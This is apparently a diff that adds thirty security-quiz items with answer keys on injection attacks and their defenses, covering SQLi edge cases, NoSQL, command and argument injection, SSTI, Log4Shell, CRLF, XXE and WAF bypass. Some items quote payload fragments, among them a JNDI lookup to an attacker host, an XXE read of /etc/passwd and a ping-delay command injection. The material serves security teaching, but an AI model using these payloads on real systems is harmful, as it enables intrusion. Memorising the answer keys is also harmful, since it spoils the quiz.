@@ -1111,3 +1111,636 @@ questions:
     data in the response, and tools automate them. Hiding output is not a
     defense; only preventing the injection (parameterization) is.
   ref: concepts.md#sql-injection-attack-techniques
+- id: injection-attacks-055
+  difficulty: advanced
+  tags:
+  - parameterized-queries
+  - in-list
+  - scenario
+  question: |
+    A report endpoint filters on a user-supplied list of IDs. A developer
+    writes "WHERE id IN (?)" and binds the string "1,2,3" to the single
+    placeholder. What is the result, and what is the correct approach?
+  options:
+  - It expands to three values automatically; this is correct
+  - It causes SQL injection because commas are metacharacters; escape the commas first
+  - It works only on PostgreSQL; use string concatenation elsewhere
+  - It binds the literal string '1,2,3' as one value (matching nothing / erroring); generate N placeholders "IN (?,?,?)" and bind N values
+  answer: 3
+  explanation: |
+    A single placeholder binds a single scalar value, so "1,2,3" is treated as
+    the literal string '1,2,3', not three integers. The placeholder count is
+    part of the query structure you must build: emit N "?" markers from a
+    validated count and bind the N values. It is a correctness bug, not an
+    injection, but concatenating the list instead would reintroduce SQLi.
+  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
+- id: injection-attacks-056
+  difficulty: advanced
+  tags:
+  - parameterized-queries
+  - like
+  - wildcards
+  question: |
+    A search binds user input into "WHERE name LIKE ?" as a bound parameter.
+    The user enters "50%". What is the accurate assessment?
+  options:
+  - This is SQL injection; the '%' breaks out of the query
+  - The query fails to compile because '%' is illegal in a bound value
+  - Binding stops SQLi, but '%' is still interpreted as a LIKE wildcard; to match a literal '%' escape it and add ESCAPE '\'
+  - Nothing special happens; '%' is always a literal inside a bound parameter
+  answer: 2
+  explanation: |
+    Binding prevents the structural breakout (no SQLi), but the bound value is
+    still interpreted as a LIKE pattern, so '%' and '_' act as wildcards. To
+    treat them literally, escape them in the value and declare the escape
+    character with ESCAPE '\'. This is a pattern-semantics/DoS concern, not an
+    injection fix.
+  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
+- id: injection-attacks-057
+  difficulty: expert
+  tags:
+  - parameterized-queries
+  - order-by
+  - scenario
+  question: |
+    Users pick a sort column and direction. Which implementation is both
+    injection-safe and correct?
+  options:
+  - 'Bind the column name and direction as two parameters: "ORDER BY ? ?"'
+  - Concatenate the column after escaping single quotes in it
+  - Map the requested column through a fixed allowlist to a server-controlled identifier and validate direction against the set {ASC, DESC}
+  - Reject the request unless the column contains only letters, then concatenate it
+  answer: 2
+  explanation: |
+    Identifiers and ASC/DESC are query structure and cannot be bound. The safe
+    pattern is an allowlist map from user input to known-good column names,
+    plus validating direction against the two-value set. "Only letters then
+    concatenate" is still an allowlist-by-characters (weaker, and legitimate
+    columns may contain underscores/digits) — an explicit identifier allowlist
+    is the correct control.
+  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
+- id: injection-attacks-058
+  difficulty: advanced
+  tags:
+  - parameterized-queries
+  - troubleshooting
+  question: |
+    An application "parameterizes every query" yet a pentest found working
+    SQLi. Which of the following is NOT a plausible explanation?
+  options:
+  - A second-order stored value is concatenated into a later query
+  - A raw/nativeQuery escape hatch builds SQL by string concatenation
+  - A dynamic ORDER BY column is concatenated from user input
+  - The prepared statement bound a value that contained the substring "OR 1=1"
+  answer: 3
+  explanation: |
+    A bound value containing "OR 1=1" is harmless — that is exactly what
+    parameterization neutralizes. The real causes are second-order stored data,
+    raw/native escape hatches, and dynamic identifier concatenation (which
+    binding cannot cover). Binding protects values, not the query structure.
+  ref: concepts.md#parameterization-edge-cases-in-lists-like-limit-and-identifiers
+- id: injection-attacks-059
+  difficulty: expert
+  tags:
+  - nosql
+  - regex
+  - blind
+  question: |
+    A MongoDB query places a user value into a $regex match on a secret field.
+    How would an attacker extract the secret, and what does this parallel?
+  options:
+  - 'By anchored patterns like {"$regex":"^a"}, {"$regex":"^ab"}, ... observing which prefix matches — a boolean oracle, paralleling boolean-blind SQLi'
+  - 'By sending {"$ne": null} once to dump the whole field'
+  - By forcing a type-conversion error that echoes the value
+  - Regex cannot be used to extract data; it only matches yes/no on the full value
+  answer: 0
+  explanation: |
+    An attacker anchors the regex and lengthens the known prefix one character
+    at a time, using match/no-match as a boolean oracle to reconstruct the
+    secret character-by-character — the NoSQL analogue of boolean-based blind
+    SQLi. Type enforcement and not building queries from raw input prevent it.
+  ref: concepts.md#nosql-syntax-blind-and-timing-injection
+- id: injection-attacks-060
+  difficulty: expert
+  tags:
+  - nosql
+  - where
+  - timing
+  question: |
+    An endpoint builds a MongoDB $where JavaScript expression from user input.
+    Besides RCE-style abuse, how can an attacker extract data even with no
+    visible output?
+  options:
+  - By reading verbose Mongo errors that always echo documents
+  - 'By supplying {"$ne": ""} which prints the document to the response'
+  - Extraction is impossible through $where without visible output
+  - With a conditional sleep in the JS (e.g. if(char==='a') sleep(5000)) turning latency into a data channel — time-based blind, NoSQL flavor
+  answer: 3
+  explanation: |
+    Because $where runs server-side JavaScript, a conditional sleep makes
+    response latency depend on a tested condition, exactly like time-based
+    blind SQLi. This is why server-side JS should be disabled
+    (security.javascriptEnabled: false) and user input must never build $where
+    expressions.
+  ref: concepts.md#nosql-syntax-blind-and-timing-injection
+- id: injection-attacks-061
+  difficulty: advanced
+  tags:
+  - nosql
+  - syntax-injection
+  question: |
+    NoSQL "syntax injection" (as opposed to operator injection) most directly
+    occurs when:
+  options:
+  - The query is built as a string (e.g. a $where JS expression) and user input breaks out of a quoted literal, e.g. "' || '1'=='1"
+  - A JSON body contains a $ne operator object
+  - The database uses BSON instead of JSON
+  - A findById call is made with a valid ObjectId
+  answer: 0
+  explanation: |
+    Syntax injection is the classic string-breakout: when a NoSQL query
+    (commonly a $where JavaScript string) is assembled by concatenation, a
+    quote or "|| '1'=='1'" escapes the literal and rewrites the logic — the
+    direct analogue of "' OR '1'='1" in SQL. Operator injection ($ne object) is
+    a distinct, object-based vector.
+  ref: concepts.md#nosql-syntax-blind-and-timing-injection
+- id: injection-attacks-062
+  difficulty: advanced
+  tags:
+  - command-injection
+  - blind
+  question: |
+    An OS command runs but its output never reaches the HTTP response. Which
+    set of techniques confirms and exploits this blind command injection?
+  options:
+  - UNION SELECT, ORDER BY probing, and error-based extraction
+  - $ne operator injection and $regex oracles
+  - Only reading verbose stack traces from the response
+  - Time delay (& ping -c 10 127.0.0.1 &), output redirection to a web-reachable file, and OAST DNS/HTTP exfiltration
+  answer: 3
+  explanation: |
+    Blind OS command injection mirrors blind SQLi: prove execution with a
+    measurable time delay (ping/sleep), redirect output to a file you can then
+    fetch, or exfiltrate via an out-of-band DNS/HTTP request to a collaborator
+    (DNS often escapes even when HTTP egress is firewalled).
+  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
+- id: injection-attacks-063
+  difficulty: expert
+  tags:
+  - argument-injection
+  - curl
+  - scenario
+  question: |
+    A service runs, without a shell, the argv array ["curl", userUrl] where
+    userUrl is user-controlled. Ignoring command chaining, what is the sharpest
+    risk and its fix?
+  options:
+  - No risk exists because there is no shell
+  - The only risk is SSRF; block internal IPs and you are done
+  - userUrl beginning with '-' can inject flags like -o/--output or -K (read an attacker config); reject leading '-', allowlist, and pass '--' before the operand
+  - curl cannot be abused via arguments; only wget can
+  answer: 2
+  explanation: |
+    An argv array stops chaining but not argument injection. If userUrl starts
+    with '-', curl parses it as a flag: -o/--output writes files, --upload-file
+    exfiltrates, -K/--config loads an attacker-controlled config. Defenses:
+    reject values starting with '-', allowlist, and pass '--' end-of-options
+    before the operand. (SSRF is a separate, additional concern.)
+  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
+- id: injection-attacks-064
+  difficulty: expert
+  tags:
+  - command-injection
+  - escapeshellarg
+  - escapeshellcmd
+  question: |
+    A PHP app builds a shell command string. Which statement about
+    escapeshellcmd vs escapeshellarg is correct?
+  options:
+  - escapeshellcmd quotes the value into a single argument; escapeshellarg only escapes metacharacters
+  - Both guarantee the input becomes exactly one argument
+  - escapeshellcmd escapes metacharacters but can still let input add an extra argument (argument injection); escapeshellarg quotes to a single argument
+  - Neither is needed if the command runs as a non-root user
+  answer: 2
+  explanation: |
+    escapeshellcmd neutralizes command-chaining metacharacters but does not
+    quote the value to one argument, so an attacker can still inject an extra
+    argument/flag. escapeshellarg wraps the value so it is exactly one
+    argument. Better still, use an argv array and skip the shell entirely.
+  ref: concepts.md#blind-os-command-injection-and-the-argument-injection-arsenal
+- id: injection-attacks-065
+  difficulty: advanced
+  tags:
+  - ssti
+  - detection
+  question: |
+    Testing a suspected sink, you submit {{7*7}} and the response contains 49.
+    What have you most likely found, and how does it differ from XSS?
+  options:
+  - 'Server-side template injection: the expression was evaluated on the server (often RCE-capable), unlike XSS which executes in the browser'
+  - 'Reflected XSS: the browser rendered the math'
+  - A caching bug that duplicated the input
+  - LDAP injection, because braces are LDAP metacharacters
+  answer: 0
+  explanation: |
+    A math expression evaluated to its result server-side indicates SSTI
+    (CWE-1336/CWE-94), which commonly escalates to RCE via the engine's object
+    graph. XSS, by contrast, executes attacker script in the victim's browser;
+    the discriminator is where the evaluation happens.
+  ref: concepts.md#server-side-template-injection-ssti
+- id: injection-attacks-066
+  difficulty: expert
+  tags:
+  - ssti
+  - fingerprinting
+  question: |
+    After confirming SSTI, you submit {{7*'7'}}. Twig returns 49 while Jinja2
+    returns 7777777. Why does this matter to an attacker?
+  options:
+  - It proves the sink is actually XSS, not SSTI
+  - It shows the value is being escaped correctly
+  - The differing result fingerprints the template engine, which determines the RCE gadget chain to use
+  - It confirms the database is MySQL
+  answer: 2
+  explanation: |
+    {{7*'7'}} coerces to 49 in Twig (numeric) but repeats the string to
+    7777777 in Jinja2 — engine-specific behavior that fingerprints the engine.
+    Knowing the engine lets the attacker pick the correct object/class-traversal
+    payload to reach code execution.
+  ref: concepts.md#server-side-template-injection-ssti
+- id: injection-attacks-067
+  difficulty: expert
+  tags:
+  - ssti
+  - defense
+  question: |
+    Which is the most robust defense against server-side template injection?
+  options:
+  - Rely on the template engine's sandbox to contain any user template
+  - HTML-encode the output of the template
+  - Never render user-supplied templates; keep untrusted input as template data (context variables), never concatenated into template source
+  - Block the template delimiter sequences with a WAF
+  answer: 2
+  explanation: |
+    SSTI is a code-vs-data failure: the fix is to treat untrusted input as data
+    that fills template variables, never as part of the template source, and to
+    avoid rendering user-supplied templates. Sandboxes are bypass-prone (not a
+    primary control), output encoding addresses XSS not server-side evaluation,
+    and WAF blocklisting is trivially evaded.
+  ref: concepts.md#server-side-template-injection-ssti
+- id: injection-attacks-068
+  difficulty: expert
+  tags:
+  - expression-language
+  - struts
+  - cve
+  question: |
+    In the Equifax breach (CVE-2017-5638), how did attacker input reach code
+    execution in Apache Struts 2?
+  options:
+  - A SQL UNION in a search box dumped the credentials table
+  - A weak TLS cipher allowed decryption of traffic
+  - A crafted Content-Type HTTP header was evaluated as an OGNL expression by the multipart parser, giving RCE
+  - A default admin password was left unchanged
+  answer: 2
+  explanation: |
+    CVE-2017-5638 was expression-language injection (CWE-917): the Jakarta
+    multipart parser evaluated the Content-Type header as an OGNL expression, so
+    a crafted header ran arbitrary OS commands. The fix is to never evaluate
+    untrusted input as an expression (and upgrade past the vulnerable parser).
+  ref: concepts.md#expression-language-injection-ognl-spel-and-the-struts-cves
+- id: injection-attacks-069
+  difficulty: advanced
+  tags:
+  - expression-language
+  - concepts
+  question: |
+    Which best describes expression-language injection (OGNL/SpEL) as a
+    vulnerability class?
+  options:
+  - Untrusted input reaches an expression evaluator (OGNL, SpEL, JSP/JSF EL) and is executed as an expression
+  - A brute-force attack against login forms
+  - A misconfiguration of TLS certificate validation
+  - A race condition in session handling
+  answer: 0
+  explanation: |
+    EL injection (CWE-917) is the SSTI cousin outside HTML templating: request-
+    controlled strings (headers, params) reach an expression interpreter such as
+    OGNL (Struts, MyBatis) or SpEL (Spring) and are evaluated, frequently
+    yielding RCE. The fix is structural — do not route untrusted data into
+    expression evaluation.
+  ref: concepts.md#expression-language-injection-ognl-spel-and-the-struts-cves
+- id: injection-attacks-070
+  difficulty: expert
+  tags:
+  - log4shell
+  - jndi
+  - cve
+  question: |
+    Log4Shell (CVE-2021-44228) achieved RCE because Log4j 2:
+  options:
+  - Stored log files with world-writable permissions
+  - Used an outdated TLS library
+  - Logged passwords in plaintext
+  - 'Interpolated ${jndi:ldap://...} lookups inside logged strings, resolving a remote JNDI name and loading an attacker-controlled class'
+  answer: 3
+  explanation: |
+    Log4j performed message lookups: any logged attacker-controlled string
+    containing ${jndi:ldap://attacker/a} triggered a JNDI lookup over LDAP/RMI
+    that fetched and loaded a remote Java class — RCE. It is an
+    interpolation/injection flaw: untrusted data placed into a string that is
+    later interpreted.
+  ref: concepts.md#log4shell-and-jndi-injection
+- id: injection-attacks-071
+  difficulty: expert
+  tags:
+  - log4shell
+  - mitigation
+  question: |
+    Which is the correct, complete remediation for Log4Shell, and why is the
+    common flag not enough?
+  options:
+  - Upgrade Log4j to 2.17.1+; formatMsgNoLookups was only a partial mitigation (it did not fully address CVE-2021-45046)
+  - Set log4j2.formatMsgNoLookups=true; it fully fixes all related CVEs
+  - Block the string "jndi" in a WAF; that is the definitive fix
+  - Stop logging HTTP headers; nothing else is needed
+  answer: 0
+  explanation: |
+    Upgrading Log4j (to 2.17.1+) is the real fix. formatMsgNoLookups disables
+    message lookups but did not fully address the follow-up CVE-2021-45046, and
+    WAF string-blocking is bypassable. Egress filtering of outbound LDAP/RMI
+    limits blast radius but is not a fix.
+  ref: concepts.md#log4shell-and-jndi-injection
+- id: injection-attacks-072
+  difficulty: advanced
+  tags:
+  - log-injection
+  - crlf
+  question: |
+    An application writes an unsanitized username directly into a text log
+    line. What is the primary injection risk and its fix?
+  options:
+  - No risk; logs are internal and cannot be attacked
+  - Only a performance risk from large log files; rotate logs
+  - Log injection/forging via CR/LF (%0d%0a) to forge entries or poison logs; neutralize newlines and log as structured fields
+  - SQL injection into the logging database; parameterize the log insert
+  answer: 2
+  explanation: |
+    CR/LF in a logged value lets an attacker forge fake log lines, corrupt log
+    integrity, or (log poisoning) inject content the server later executes.
+    The fix is to neutralize CR/LF in logged values and log structured fields
+    (e.g. JSON) rather than concatenating raw input into lines (CWE-117).
+  ref: concepts.md#log-injection-and-crlf--header-injection
+- id: injection-attacks-073
+  difficulty: expert
+  tags:
+  - crlf
+  - response-splitting
+  - scenario
+  question: |
+    A handler sets a redirect header as "Location: " + userInput without
+    filtering. Supplying a value containing %0d%0a enables which attack, and
+    what is the fix?
+  options:
+  - SQL injection; parameterize the redirect query
+  - Clickjacking; add an X-Frame-Options header
+  - CSRF; add an anti-forgery token
+  - 'HTTP response splitting / header injection: injected CR/LF add headers or split the response (cache poisoning). Fix: reject CR/LF/NUL and use safe header APIs'
+  answer: 3
+  explanation: |
+    Unfiltered CR/LF in a header value lets the attacker inject extra headers or
+    split the response into two (CWE-93/CWE-113), enabling forged headers,
+    cookie injection, and cache poisoning. The fix is to strip/reject CR, LF,
+    and NUL and to build headers with framework APIs that reject control
+    characters — never raw concatenation.
+  ref: concepts.md#log-injection-and-crlf--header-injection
+- id: injection-attacks-074
+  difficulty: expert
+  tags:
+  - xxe
+  - file-read
+  - scenario
+  question: |
+    An endpoint parses attacker-supplied XML. The payload defines
+    <!ENTITY x SYSTEM "file:///etc/passwd"> and references &x;. What class of
+    attack is this and what is the definitive fix?
+  options:
+  - CSRF; add a synchronizer token
+  - SSTI; use a logic-less template engine
+  - SQL injection; parameterize the query
+  - XXE (CWE-611) enabling file disclosure/SSRF/DoS; disable DTD/DOCTYPE processing (disallow-doctype-decl) or external entities
+  answer: 3
+  explanation: |
+    This is XML External Entity injection: the parser resolves the external
+    entity, disclosing local files (and enabling SSRF and billion-laughs DoS).
+    The definitive fix is to disable DTD/DOCTYPE processing entirely, or at
+    minimum external general and parameter entities and entity expansion, per
+    the OWASP XXE Prevention Cheat Sheet.
+  ref: concepts.md#xml-external-entity-xxe-injection
+- id: injection-attacks-075
+  difficulty: advanced
+  tags:
+  - xxe
+  - dos
+  question: |
+    The "billion laughs" attack against an XML parser is a form of:
+  options:
+  - Denial of service via exponentially nested entity expansion
+  - Cross-site scripting through XML
+  - A timing side channel that leaks the private key
+  - An LDAP wildcard enumeration
+  answer: 0
+  explanation: |
+    Billion laughs defines nested entities that reference each other so
+    expansion grows exponentially, exhausting memory/CPU — a DoS variant of XXE.
+    Disabling DTDs and entity expansion prevents it.
+  ref: concepts.md#xml-external-entity-xxe-injection
+- id: injection-attacks-076
+  difficulty: expert
+  tags:
+  - waf
+  - json-sqli
+  - bypass
+  question: |
+    The Claroty Team82 (2022) research showed major WAFs could be bypassed for
+    SQL injection by:
+  options:
+  - Sending the payload over HTTP/2 instead of HTTP/1.1
+  - Encrypting the payload with the server's public key
+  - Prepending native JSON operators (e.g. @>, JSON_EXTRACT, ->>) so the WAF failed to parse it as SQL while the database still executed it
+  - Using a very long URL to overflow the WAF buffer
+  answer: 2
+  explanation: |
+    Databases added JSON operators (->, ->>, @>, <@, JSON_EXTRACT, ::jsonb) that
+    WAF signature engines (Palo Alto, F5, AWS, Cloudflare, Imperva) did not
+    recognize as part of a SQL statement. Prepending them blinded the WAF while
+    the DB still ran the query — the canonical modern proof that WAF signatures
+    are bypassable.
+  ref: concepts.md#modern-waf-bypasses-json-based-sqli
+- id: injection-attacks-077
+  difficulty: advanced
+  tags:
+  - waf
+  - scenario
+  question: |
+    "We added a WAF and it blocked our SQLi test payload — are we safe now?"
+    What is the best response?
+  options:
+  - Yes; a passing WAF test proves the injection is fixed
+  - No; WAF signatures are bypassable (JSON operators, encoding/case/comment tricks) and cannot see second-order or non-HTTP injection — fix the code
+  - Yes, provided the WAF is in blocking mode rather than detection mode
+  - No, but only because the WAF needs a paid subscription to be effective
+  answer: 1
+  explanation: |
+    A WAF catching one signature does not fix the vulnerability. Signatures are
+    bypassable (JSON-based bypass, encoding, case, comments, whitespace) and the
+    edge WAF never sees second-order payloads or server-to-server/non-HTTP
+    paths. Parameterize the code; treat the WAF as defense in depth / virtual
+    patching only.
+  ref: concepts.md#modern-waf-bypasses-json-based-sqli
+- id: injection-attacks-078
+  difficulty: expert
+  tags:
+  - sqli-to-rce
+  - mysql
+  - least-privilege
+  question: |
+    Which MySQL privilege/feature most directly lets a SQL injection escalate
+    from reading rows to writing a web shell or reading arbitrary files?
+  options:
+  - The SELECT privilege on the application's own tables
+  - The FILE privilege enabling LOAD_FILE() and INTO OUTFILE (constrained by secure_file_priv)
+  - The ability to run stored procedures
+  - Connection pooling
+  answer: 1
+  explanation: |
+    The FILE privilege enables LOAD_FILE() (read files) and INTO OUTFILE (write
+    files, e.g. dropping a web shell in the web root). Not granting FILE and
+    setting secure_file_priv keeps an injection confined to data. This is why
+    least privilege is load-bearing defense in depth.
+  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
+- id: injection-attacks-079
+  difficulty: expert
+  tags:
+  - sqli-to-rce
+  - postgres
+  - mssql
+  question: |
+    Match the OS-command-execution escalation primitive to its database:
+  options:
+  - 'PostgreSQL: xp_cmdshell; MS SQL Server: COPY ... FROM PROGRAM'
+  - 'PostgreSQL: COPY ... FROM/TO PROGRAM; MS SQL Server: xp_cmdshell'
+  - Both use LOAD_FILE() for OS command execution
+  - Neither database can ever run OS commands via SQL
+  answer: 1
+  explanation: |
+    PostgreSQL's COPY ... FROM/TO PROGRAM runs OS commands (requires elevated
+    role), while MS SQL Server's xp_cmdshell executes shell commands. Running
+    the app as a non-superuser/low-privilege login without these capabilities
+    prevents SQLi-to-RCE escalation on each engine.
+  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
+- id: injection-attacks-080
+  difficulty: advanced
+  tags:
+  - sqli-to-rce
+  - least-privilege
+  question: |
+    A parameterized app also runs its DB connection as a non-superuser without
+    FILE/xp_cmdshell/COPY PROGRAM. If a future raw query reintroduces SQLi, what
+    is the practical effect of this hardening?
+  options:
+  - It prevents the injection from ever being exploitable
+  - It makes the injection faster to exploit
+  - It converts a potential file-write/OS-command takeover into, at worst, reading the rows that account could already access
+  - It has no effect once SQLi exists
+  answer: 2
+  explanation: |
+    Least privilege does not stop the injection but bounds it: without file or
+    OS-command capabilities, escalation to RCE is blocked and the impact is
+    limited to the data the account could already touch — the difference between
+    a full breach and a contained incident.
+  ref: concepts.md#sqli-to-rce-escalation-and-per-database-hardening
+- id: injection-attacks-081
+  difficulty: expert
+  tags:
+  - blind
+  - oast
+  - efficiency
+  question: |
+    Time-based blind extraction is painfully slow on a large secret. Which
+    approach most improves exfiltration throughput when the injection is fully
+    blind?
+  options:
+  - Switch to UNION-based extraction, which always works when blind
+  - Use OAST/out-of-band DNS to exfiltrate whole values per request (subdomain-encoded), which also often escapes HTTP egress filtering
+  - Retry each request many times to average out the timing
+  - Ask the database to email the results
+  answer: 1
+  explanation: |
+    OAST via DNS is the go-to for fully-blind injection: encode data in a DNS
+    subdomain the DB is forced to resolve, exfiltrating whole values per request
+    rather than one bit at a time — and DNS frequently escapes even when HTTP
+    egress is blocked. UNION does not work when there is no visible output.
+  ref: concepts.md#efficient-blind-extraction-and-oast
+- id: injection-attacks-082
+  difficulty: advanced
+  tags:
+  - blind
+  - binary-search
+  question: |
+    In boolean/time-based blind SQLi, why do attackers use binary search per
+    character rather than testing equality against each candidate?
+  options:
+  - Binary search avoids triggering the WAF
+  - It reduces requests per ASCII character from dozens to about 7-8 by halving the value range each step
+  - Equality tests are impossible in SQL
+  - Binary search decrypts the value directly
+  answer: 1
+  explanation: |
+    Instead of up to ~256 equality tests, binary search compares against
+    midpoints (> 'm'? > 't'? ...) to isolate each character in roughly 7-8
+    requests (log2 of the range), or extracts bit-by-bit — a large speedup that
+    underscores why hiding output is not a defense.
+  ref: concepts.md#efficient-blind-extraction-and-oast
+- id: injection-attacks-083
+  difficulty: intermediate
+  tags:
+  - jndi
+  - concepts
+  question: |
+    Beyond Log4j specifically, JNDI injection is dangerous whenever an
+    application:
+  options:
+  - Uses prepared statements for all queries
+  - Resolves an attacker-influenced JNDI name, which can trigger remote class loading and RCE
+  - Logs to a structured JSON format
+  - Validates that inputs are the expected type
+  answer: 1
+  explanation: |
+    JNDI injection is not unique to Log4j: any code that looks up an
+    attacker-controlled JNDI name over LDAP/RMI risks fetching and loading a
+    remote class, yielding RCE. The defense is to never resolve untrusted JNDI
+    names and to restrict remote-class-loading.
+  ref: concepts.md#log4shell-and-jndi-injection
+- id: injection-attacks-084
+  difficulty: advanced
+  tags:
+  - nosql
+  - defense
+  - type-check
+  question: |
+    Which single control most broadly defeats both MongoDB operator injection
+    (via JSON body or nested query-string) and simple syntax injection?
+  options:
+  - Renaming the collection
+  - Enforcing that fields expected to be scalars are strings (rejecting objects/arrays) via schema validation before they reach the query
+  - Adding a WAF rule for the character '$'
+  - Encrypting documents at rest
+  answer: 1
+  explanation: |
+    Type enforcement — rejecting objects/arrays where a string is expected —
+    stops an attacker smuggling an operator object ($ne, $gt) whether it arrives
+    as JSON or as a nested bracket query-string (user[pw][$ne]=), and keeps
+    untrusted objects out of the query document. It is the primary NoSQL
+    control, ahead of blocklisting or encryption.
+  ref: concepts.md#nosql-syntax-blind-and-timing-injection
